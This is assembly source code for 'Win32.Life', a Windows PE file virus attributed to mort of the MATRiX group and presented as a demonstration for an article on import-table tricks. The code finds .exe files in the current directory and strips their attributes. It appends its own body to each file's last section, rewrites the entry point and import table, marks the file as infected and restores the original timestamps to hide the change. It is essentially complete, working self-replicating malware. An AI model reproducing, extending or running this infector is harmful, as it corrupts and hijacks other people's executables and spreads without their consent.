
   ;comment "

   ;        Win32.Life by mort[MATRiX]

   ;        nonresident Pe infector written only to show some theoretical stuff

   ;        (see the 'Import game' article,...)

   ;        not written to use only to show -> bugs,...

   ;        (but on my comp run nice,...:XXX)

   ;        yea,... and no SEH,... :)

   ;"





   .386

   .model flat, stdcall



   max_path EQU 260

   filetime                        struc

           FT_dwLowDateTime        dd ?

           FT_dwHighDateTime       dd ?

   filetime                        ends



   fileSearch                      struc

           FileAttributes          dd ?

           CreationTime            filetime ?

           LastAccessTime          filetime ?

           LastWriteTime           filetime ?

           FileSizeHigh            dd ?

           FileSizeLow             dd ?

           Reserved0               dd ?

           Reserved1               dd ?

           FileName                db max_path dup(?)

           AlternateFileName       db 13 dup(?)

                                   db 3 dup(?)

   fileSearch                      ends





   extrn                   ExitProcess             : proc

   extrn                   CreateFileA             : proc

   extrn                   CreateFileMappingA      : proc

   extrn                   MapViewOfFile           : proc

   extrn                   UnmapViewOfFile         : proc

   extrn                   CloseHandle             : proc

   extrn                   FindFirstFileA          : proc

   extrn                   FindNextFileA           : proc

   extrn                   SetFileAttributesA      : proc

   extrn                   SetFileTime             : proc

   extrn                   FlushViewOfFile         : proc

   extrn                   GetModuleHandleA        : proc

   extrn                   GetProcAddress          : proc

   extrn                   LoadLibraryA            : proc



   _APIcount               = 13

   _debug                  = 0

   _importAddc             = 0403000h

   _importRVAc             = 03000h

   _vSize                  = _fileSearch - @lifeEntry

   _vSize0200h             = ((_fileSearch - @lifeEntry) / 0200h + 1) * 0200h



   invoke  MACRO label

           mov eax,[ebp + label - @delta]

           call [eax]

   ENDM



   .data

   dd ?



   .code

   @life:                                  ;some little stufieeeee :)

           mov eax,_vSize

           mov eax,_vSize0200h



           mov esi,_importAddc

           mov edi,offset _storedImport

           mov ecx,0200h / 4

           repnz movsd



           mov esi,offset @calls

           mov edi,offset _APItable

           mov ecx,_APIcount



   @nextAPI:

           lodsb

           lodsd

           add eax,esi

           add eax,2

           mov eax,[eax]

           stosd

           loop @nextAPI



           jmp @lifeEntry



   @calls          label                   ;import need

           call CreateFileA

           call CreateFileMappingA

           call MapViewOfFile

           call UnmapViewOfFile

           call CloseHandle

           call FindFirstFileA

           call FindNextFileA

           call SetFileAttributesA

           call SetFileTime

           call FlushViewOfFile

           call GetModuleHandleA

           call GetProcAddress

           call LoadLibraryA

           call ExitProcess



   @firstExec:

           call ExitProcess,0



   ;---[ entry ]----------------------------------------------------------------

   @lifeEntry:

           push offset @firstExec          ;return host address

   _oldIP          equ $ - 4



           xor eax,eax

           jmp @nextFile



   ;---[ close file ]-----------------------------------------------------------

   @closeIT:

           push 012345678h                 ;close map

   _mapHandle      equ $ - 4

           invoke _CloseHandle



           lea eax,[ebp + _fileSearch - @delta + LastWriteTime]

           push eax

           sub eax,8                       ;set old file time

           push eax

           sub eax,8

           push eax

           push dword ptr [ebp + _fileHandle - @delta]

           invoke _SetFileTime



           push 012345678h                 ;close file

   _fileHandle     equ $ - 4

           invoke _CloseHandle



           ret



   _APItable       label

           _CreateFileA            dd ?

           _CreateFileMappingA     dd ?

           _MapViewOfFile          dd ?

           _UnmapViewOfFile        dd ?

           _CloseHandle            dd ?

           _FindFirstFileA         dd ?

           _FindNextFileA          dd ?

           _SetFileAttributesA     dd ?

           _SetFileTime            dd ?

           _FlushViewOfFile        dd ?

           _GetModuleHandleA       dd ?

           _GetProcAddress         dd ?

           _LoadLibraryA           dd ?

           _ExitProcess            dd ?

   ;---[ oen and map file ]-----------------------------------------------------

   _newFileSize                    dd ?



   @open:

           push 0 0 3 0 1 080000000h or 040000000h ;& open it

           push eax

           invoke _CreateFileA

           mov [ebp + _fileHandle - @delta],eax

           xchg eax,ebx



           inc ebx

           jz @oFailed



           mov eax,[ebp + _fileSearch - @delta + FileSizeLow]

           mov [ebp + _newFileSize - @delta],eax

           push eax

           add eax,_vSize

           push eax



           push 0 eax 0 4 0 ebx                    ;create map

           invoke _CreateFileMappingA

           pop ebx



           mov [ebp + _mapHandle - @delta],eax



           push ebx                                ;and use it,...

           push 0 0 2

           push eax

           invoke _MapViewOfFile



           pop ebx                         ;file size



   @oFailed:

           ret

   ;---[ infect ]---------------------------------------------------------------

   @infect:

           pusha



           push dword ptr [ebp + _fileSearch - @delta + FileAttributes]

           lea eax,[ebp + _fileSearch - @delta + FileName] ;set attributes

           push eax



           push eax

           push 020h

           push eax

           invoke _SetFileAttributesA



           pop eax                 ;file name

           call @open



           or ebx,ebx              ;failed?

           jz @failed



           push eax eax            ;map base



           call @finalInfect



           pop ebx



           push dword ptr [ebp + _newFileSize - @delta]    ;!!!!!!!!!!!!!!!11

           push ebx

           invoke _FlushViewOfFile



           invoke _UnmapViewOfFile



           call @closeIT



   @failed:

           invoke _SetFileAttributesA



           popa

           inc eax



   @nextFile:

           call @findFile

   @delta          label



   if _debug

           or eax,eax

           jz @hm



           mov eax,offset _fileSearch + FileName

           cmp dword ptr [eax],'SOHG'

           mov eax,0

           jz @infect

           mov eax,1

           jmp @nextFile



   @hm:

   endif

           dec eax

           jz @infect



           std             ;infection finnished,... restoring import



           pop edi

           std

           add edi,0200h - 4

           mov ecx,0200h / 4



           mov eax,[ebp + _GetModuleHandleA - @delta]

           push dword ptr [eax]

           pop dword ptr [ebp + _GetModuleHandleA - @delta]



           mov eax,[ebp + _GetProcAddress - @delta]

           push dword ptr [eax]

           pop dword ptr [ebp + _GetProcAddress - @delta]



           mov eax,[ebp + _LoadLibraryA - @delta]

           push dword ptr [eax]

           pop dword ptr [ebp + _LoadLibraryA - @delta]



           mov eax,[ebp + _ExitProcess - @delta]

           push dword ptr [eax]

           pop dword ptr [ebp + _ExitProcess - @delta]





   @next2Pop:                      ;restore 'stored import' :)

           pop eax

           stosd

           dec ecx

           jnz @next2Pop



           call @hereWeGo          ;and relocate it



           ret                     ;and return to host



   _mask           db '*.exe',0



   ;---[ find file ]------------------------------------------------------------

   @findFile:

           mov ebp,[esp]

           dec eax

           jz @findNext



           lea eax,[ebp + offset _fileSearch - @delta]

           push eax

           lea eax,[ebp + offset _mask - @delta]

           push eax

           invoke _FindFirstFileA



           mov [ebp + _findHandle - @delta],eax

           inc eax

           pop edi

           jz @ffFailed



           lea esi,[ebp + _storedImport - @delta]  ;save old import to stack

           mov ecx,0200h / 4



   @next2Push:

           lodsd

           push eax

           dec ecx

           jnz @next2Push



           push _importAddc                        ;plus import address

   _importAdd      equ $ - 4



           xor eax,eax

           inc eax



   @ffFailed:

           jmp edi



   @findNext:

           lea eax,[ebp + offset _fileSearch - @delta]

           push eax

           push 012345678h

   _findHandle     equ $ - 4

           invoke _FindNextFileA



           ret



   ;---[ import game]-----------------------------------------------------------

   @importGame:

           pusha



           lea edi,[ebp + _storedImport - @delta]  ;store host's import

           mov eax,[ecx + 014h]

           add eax,ebx

           xchg eax,esi

           mov eax,0200h / 4

           push eax

           xchg eax,ecx

           repnz movsd



           xchg eax,edx                    ;get import delta

           sub eax,_importRVAc



           sub esi,0200h                   ;copy new import to host

           xchg edi,esi

           pop ecx



           mov esi,[esp + 058h]



           repnz movsd



           xchg edi,esi

           sub esi,0200h



           add [esi],eax                   ;headers,...

           add [esi + 0ch],eax

           add [esi + 010h],eax

           add esi,028h



           xchg eax,edx

           mov ecx,_APIcount + 1           ;and table,...

           push ecx

           push esi



   @nextNum:

           add [esi],edx

           lodsd

           loop @nextNum

           lodsd



           xchg esi,edi

           pop esi

           pop ecx

           rep movsd



           popa

           ret

   ;---[ game with file ]-------------------------------------------------------

   @finalInfect:

           mov ebx,eax             ;im sorry for this,...

           cmp word ptr [eax],'ZM' ;no weed,... hi benny :)

           jnz @thatsFuckedAndMEtoo

           cmp word ptr [eax + 034h],'TM'

           jz @thatsFuckedAndMEtoo

           add eax,[eax + 03ch]

           cmp dword ptr [eax],'EP'

           jnz @thatsFuckedAndMEtoo



           xchg eax,esi



           mov eax,[esi + 028h]            ;set new old IP :)

           add eax,[esi + 034h]

           mov [ebp + _oldIP - @delta],eax



           movzx eax,word ptr [esi + 6]    ;sections' count

           xchg eax,edi



           mov eax,[esi + 074h]    ;get sec's headers offset

           shl eax,3

           add eax,050h

           add eax,esi



           mov edx,[esi + 080h]    ;get import RVA



           dec edi

           dec ebx



   @tvaMatkaBylaSneznaFreza:

           mov ecx,eax

           inc ebx

   @nextSectionHeader:             ;and find import and last section header

           add eax,028h

           cmp [eax + 0ch],edx

           jz @tvaMatkaBylaSneznaFreza



           dec edi

           jnz @nextSectionHeader



           or ebx,1

           jnz @thatsFuckedAndMEtoo



           dec ebx



           ;eax            - last section header offset

           ;ecx            - import header offset

           ;[esp + 034h]   - virii import offset



           call @importGame



           xchg eax,edx            ;set import address in vir's body

           add eax,[esi + 034h]

           mov [ebp + _importAdd - @delta],eax



           call @infectLastSec



   @thatsFuckedAndMEtoo:

           ret

   ;---[ append body to last section ]------------------------------------------

   @infectLastSec:

           mov ecx,[edx + 010h]

           mov eax,[edx + 0ch]

           add eax,ecx

           mov [esi + 028h],eax                    ;new entry point

           xchg eax,ecx

           add eax,[edx + 014h]

           add eax,ebx                             ;place to copy



           add dword ptr [edx + 010h],_vSize0200h

           add dword ptr [esi + 050h],_vSize0200h

           add dword ptr [ebp + _newFileSize - @delta],_vSize0200h

           add dword ptr [edx + 08],01000h

           mov word ptr [ebx + 034h],'TM'

           or dword ptr [edx + 024h],0a0000020h



           xchg eax,edi

           lea esi,[ebp + @lifeEntry - @delta]

           mov ecx,_vSize

           rep movsb

           ret



   ;---[ here we go,... ]-------------------------------------------------------

   @hereWeGo:



           cld

           add edi,4

           push 0

           call [ebp + _GetModuleHandleA - @delta]

           xchg eax,ebx



           xchg edi,esi



   @nextModule:

           mov eax,[esi + 0ch]             ;load library module

           or eax,eax

           jz @finished



           add eax,ebx

           push eax

           call [ebp + _LoadLibraryA - @delta]



           mov [ebp + _moduleHandle - @delta],eax



           or eax,eax

           jz @notAvailModule



           call @getModuleAPIs             ;get APIs addresses



           add esi,014h

           jmp @nextModule



   @notAvailModule:

           call @GDI32                     ;no module founded

           db 'gdi32.dll',0

   @GDI32:

           call [ebp + _LoadLibraryA - @delta]



           push 0 0

           call @mess

           db '.u have no fucked DLL to run this progie,...',0

   @mess:

           push 0

           call @GPA

   @GPA:

           db 'MessageBoxA',0

           push eax

           call [ebp + _GetProcAddress - @delta]

           call eax

           push 0

           call [ebp + _ExitProcess - @delta]



   @finished:

           ret



   ;---[ get APIs of current module ]-------------------------------------------

   @getModuleAPIs:

           pusha

           mov edi,[esi + 010h]            ;get buffers info

           mov esi,[esi]

           add esi,ebx

           add edi,ebx



   @nextFunc:                              ;get and store APIs addresses

           lodsd

           or eax,eax

           jz @noMoreAPIs

           add eax,ebx

           add eax,2



           push eax

           push 012345678h

   _moduleHandle           equ $ - 4

           call [ebp + _GetProcAddress - @delta]



           stosd

           jmp @nextFunc



   @noMoreAPIs:

           popa

           ret



   _storedImport   db 200h dup(0)

   _fileSearch     fileSearch <>

           ret

   end @life
